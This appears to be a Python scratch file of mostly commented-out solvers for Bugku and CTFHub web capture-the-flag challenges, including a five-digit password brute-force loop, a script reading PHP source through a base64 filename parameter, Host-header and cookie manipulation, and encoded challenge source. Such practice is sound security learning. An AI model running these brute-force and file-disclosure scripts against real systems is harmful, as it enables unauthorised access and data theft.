import tool
import re,requests
tool=tool.tool()
# bugku-秋名山老司机
# url='http://123.206.87.240:8002/qiumingshan/'
# tool=tool.tool()
# for i in range(5):
#     data=tool.get_webs(url,True)
#     data={
#         'value':eval(re.findall('([0-9\+\-\*\/]+)=',data)[0])
#     }
#     _=tool.get_post(url,'post',data,True)
#     print(_)


# bugku-速度要快
# url='http://123.206.87.240:8002/web6/'
# tool=tool.tool()
# for i in range(2):
#     data=tool.bm_base64_decode(tool.get_webs(url,True).headers['flag'])
#     data=re.findall(': ([0-9A-Za-z\=]+)',str(data))[0]
#     data=tool.bm_base64_decode(data)[2]
#     data={
#         'margin':data
#     }
#     data=tool.get_post(url,'post',data,True)
#     print(data)




# url='http://123.206.87.240:8002/web3/'
# tool=tool.tool()
# for i in tool.get_webs(url,ifline=True):
#     print(tool.bm_unic2acs(i))
# url='http://123.206.87.240:8002/web3/'
# for i in tool.get_webs(url,ifline=True):
#     print(tool.bm_unic2acs(i))
# _=tool.bm_unic2acs('<!--&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;-->')
# print(_)


# url='http://123.206.87.240'
# _=tool.get_webs(url,{'Host':'flag.baidu.com'}).text
# print(_)


# url='http://123.206.87.240:8002/web12/'
# for i in range(30):
#     for j in tool.get_webs(url,ifline=True):
#         if 'flag{' in j:
#             print(j)


# for i in range(50):
# 	line=i
# 	index=tool.bm_base64_encode('index.php')
# 	url='http://123.206.87.240:8002/web11/index.php?line='+str(line)+'&filename='+index[2].decode()
# 	print(tool.get_webs(url).text)
# url='http://123.206.87.240:8002/web11/index.php?line=&filename='+tool.bm_base64_encode('keys.php')[2].decode()
# print(tool.get_webs(url,cookies={'margin':'margin'}).text)


# print(tool.bm_base64_decode('''
# JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==
# '''))
# url='http://challenge-f11748d80f0f1ddf.sandbox.ctfhub.com:10080/index.php'
# import requests
# a=requests.get(url)
# print(a.text)
# print(a.history[0].url)

# url='http://challenge-196a2715963998ed.sandbox.ctfhub.com:10080/'
# cookies={'admin':'1'}
# print(tool.get_webs(url,cookies=cookies).text)

# import base64,pickle

# a=base64.b64decode('gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu')

# b=pickle.dumps(a)

# print(b)


# for i in range(10000,99999):
#     data=tool.get_post('http://123.206.87.240:8002/baopo/?yes','POST',{'pwd':i})
#     if '密码不' not in data:
#         print(i)



# with open('1.txt','w') as f:
#     for i in range(10000,100000):
#         f.writelines(str(i)+'\n')



# print(tool.bm_base64_decode('a2V5cy50eHQ='))
# print(tool.bm_base64_encode('keys.php'))


# url='http://123.206.87.240:8002/web11/index.php?line={}&filename=aW5kZXgucGhw'
# web_content=''
# line=0
# while 1:
#     new_url=url.format(line)        #设置读取每一行的url
#     data=requests.get(new_url)
#     web_content+=data.text          #把获取到的数据添加到文本中
#     # print(data.text)
#     if '?>' in data.text:           #判断是否是php结尾，是结尾就退出
#         break
#     line+=1
# with open('1.html','w') as w:       #输出存有源码的文本
#     w.write(web_content)

    

# res=requests.get('http://123.206.87.240:8006/test/1p.html',allow_redirects=False).text
# print(res)

# t=tool.bm_url_decode('%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E')
# t=tool.bm_base64_decode('JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==')
# t=tool.bm_url_decode('%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E')


t=tool.bm_cas('73796e747b3637733935703938373039313432396f303937733235323535733639373038307d')

for i in t:
    print(i)